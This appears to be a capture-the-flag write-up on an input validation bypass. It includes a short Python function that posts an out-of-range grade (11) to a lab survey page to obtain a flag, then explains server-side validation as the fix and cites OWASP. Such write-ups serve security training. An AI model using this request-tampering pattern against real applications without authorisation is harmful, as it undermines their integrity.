# Input validation bypass attack

### Introduction
An input validation bypass attack occurs when unauthorized or incorrect data is injected into a server or application, potentially causing disruptions or compromising its functionality and integrity.

### Procedure
To submit unauthorized or invalid data to the survey page, we'll create a Python script that sends a POST request to the server with a grade value exceeding 10. This action is intended to trigger a response from the server containing the flag we seek.

### Program
We will develop a function responsible for sending a POST request to the server and retrieving the page response. This function will encapsulate the request-response mechanism, allowing us to interact with the server and obtain the corresponding page response.
``` python
def try_input():
	encoded_params = urllib.parse.urlencode({ 'page': 'survey' })

	url = 'http://192.168.56.101/?{}'.format(encoded_params)

	data = { 'sujet': '2', 'valeur': '11' }
	headers = { 'Content-Type': "application/x-www-form-urlencoded" }

	response = requests.post(url, data=data, headers=headers)

	return response.text
```

This function will assign a grade of 11 to subject 2, surpassing the permitted value set on the website. This action is intended to trigger the server's response, leading to the retrieval of the flag we are seeking.

### How to fix
To resolve this issue, the server should implement validation for the input values on the server side. It's crucial to verify and validate any values provided by the client, as they should never be inherently trusted. Implementing server-side validation helps ensure the integrity and security of the application by scrutinizing and confirming the legitimacy of the received data.

### Source
[Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)